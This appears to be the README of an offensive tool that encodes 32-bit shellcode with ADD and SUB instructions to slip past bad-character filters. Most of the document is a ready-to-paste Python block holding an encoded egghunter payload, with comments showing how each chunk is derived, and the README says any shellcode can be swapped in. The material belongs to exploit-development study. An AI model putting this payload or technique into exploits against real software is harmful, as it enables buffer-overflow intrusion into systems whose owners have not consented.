# add-sub-encoder
A 32 bit shellcode encoder using ADD and SUB. Encodes an egghunter by default,
but the shellcode can be replaced with anything. Encodes based on a list of good characters that is
defined in the script. This should be updated before using for your situation.
By default, will print out both
an ADD encoded payload and a SUB encoded payload. The output can be
directly placed into other python scripts.

```python
# BEGIN AUTOGENERATED ENCODED EGGHUNTER
zero_eax = b'%' + b'7\x1c\x1d\x0c' + b'%' + b'\x08Cbs'
encoded_egg_hunter = b''
# SUB encoding instructions: 75e7ffe7
# 0xFFFFFFFF - 0xe7ffe775 + 1 = 0x1800188b
encoded_egg_hunter += zero_eax
# 0x7d0e0101
encoded_egg_hunter += b'-' + b'\x01\x01\x0e}'
# 0x6a761637
encoded_egg_hunter += b'-' + b'7\x16vj'
# 0x307c0153
encoded_egg_hunter += b'-' + b'S\x01|0'
encoded_egg_hunter += b'P'
# SUB encoding instructions: af75eaaf
# 0xFFFFFFFF - 0xafea75af + 1 = 0x50158a51
encoded_egg_hunter += zero_eax
# 0x7c272d41
encoded_egg_hunter += b'-' + b"A-'|"
# 0x55714101
encoded_egg_hunter += b'-' + b'\x01AqU'
# 0x7e7d1c0f
encoded_egg_hunter += b'-' + b'\x0f\x1c}~'
encoded_egg_hunter += b'P'
# SUB encoding instructions: 30578bfa
# 0xFFFFFFFF - 0xfa8b5730 + 1 = 0x574a8d0
encoded_egg_hunter += zero_eax
# 0x1294f44
encoded_egg_hunter += b'-' + b'DO)\x01'
# 0x3024a7d
encoded_egg_hunter += b'-' + b'}J\x02\x03'
# 0x1490f0f
encoded_egg_hunter += b'-' + b'\x0f\x0fI\x01'
encoded_egg_hunter += b'P'
# SUB encoding instructions: efb85430
# 0xFFFFFFFF - 0x3054b8ef + 1 = 0xcfab4711
encoded_egg_hunter += zero_eax
# 0x270f5057
encoded_egg_hunter += b'-' + b"WP\x0f'"
# 0x2a327c3b
encoded_egg_hunter += b'-' + b';|2*'
# 0x7e697a7f
encoded_egg_hunter += b'-' + b'\x7fzi~'
encoded_egg_hunter += b'P'
# SUB encoding instructions: 3c055a74
# 0xFFFFFFFF - 0x745a053c + 1 = 0x8ba5fac4
encoded_egg_hunter += zero_eax
# 0x6587f50
encoded_egg_hunter += b'-' + b'P\x7fX\x06'
# 0xc115f50
encoded_egg_hunter += b'-' + b'P_\x11\x0c'
# 0x793c1c24
encoded_egg_hunter += b'-' + b'$\x1c<y'
encoded_egg_hunter += b'P'
# SUB encoding instructions: 0258cd2e
# 0xFFFFFFFF - 0x2ecd5802 + 1 = 0xd132a7fe
encoded_egg_hunter += zero_eax
# 0x793b7116
encoded_egg_hunter += b'-' + b'\x16q;y'
# 0x31783575
encoded_egg_hunter += b'-' + b'u5x1'
# 0x267f0173
encoded_egg_hunter += b'-' + b's\x01\x7f&'
encoded_egg_hunter += b'P'
# SUB encoding instructions: 0f42526a
# 0xFFFFFFFF - 0x6a52420f + 1 = 0x95adbdf1
encoded_egg_hunter += zero_eax
# 0x5243176
encoded_egg_hunter += b'-' + b'v1$\x05'
# 0x11785a03
encoded_egg_hunter += b'-' + b'\x03Zx\x11'
# 0x7f113278
encoded_egg_hunter += b'-' + b'x2\x11\x7f'
encoded_egg_hunter += b'P'
# SUB encoding instructions: 6681caff
# 0xFFFFFFFF - 0xffca8166 + 1 = 0x357e9a
encoded_egg_hunter += zero_eax
# 0x7f377542
encoded_egg_hunter += b'-' + b'Bu7\x7f'
# 0x7f7f0801
encoded_egg_hunter += b'-' + b'\x01\x08\x7f\x7f'
# 0x17f0157
encoded_egg_hunter += b'-' + b'W\x01\x7f\x01'
encoded_egg_hunter += b'P'
# END AUTOGENERATED ENCODED EGGHUNTER
```
